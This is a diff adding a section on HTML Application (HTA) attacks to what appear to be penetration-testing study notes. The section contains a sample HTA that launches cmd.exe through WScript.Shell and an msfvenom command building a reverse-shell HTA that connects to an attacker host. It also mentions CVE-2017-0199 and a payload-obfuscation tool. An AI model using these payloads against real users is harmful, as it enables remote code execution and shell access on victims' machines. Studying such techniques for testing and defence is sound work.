@@ -77,3 +77,38 @@ Client IP Address: 20.20.20.132
 ```
 
 ---
+
+# HTML Applications (HTA)
+
+### sample hta
+```html
+<html>
+	<head>
+		<script>
+			var c= 'cmd.exe'
+			new ActiveXObject('WScript.Shell').Run(c);
+		</script>
+	<head>
+	<body>
+		<script>
+			//closes the additional windows behind our command prompt
+			self.close();
+		</script>
+	</body>
+</html>
+```
+
+- sandbox protection of Internet Explorer, also called Protected Mode is enabled by default
+- The victim can select Allow to permit the action,
+	which will execute the **JavaScript code** and launch cmd.exe
+
+### Generating HTA with `msfvenom`
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f hta-psh -o evil.hta
+```
+
+### CVE-2017-0199
+
+### [Demiguise Tool](https://github.com/nccgroup/demiguise)
+
+---
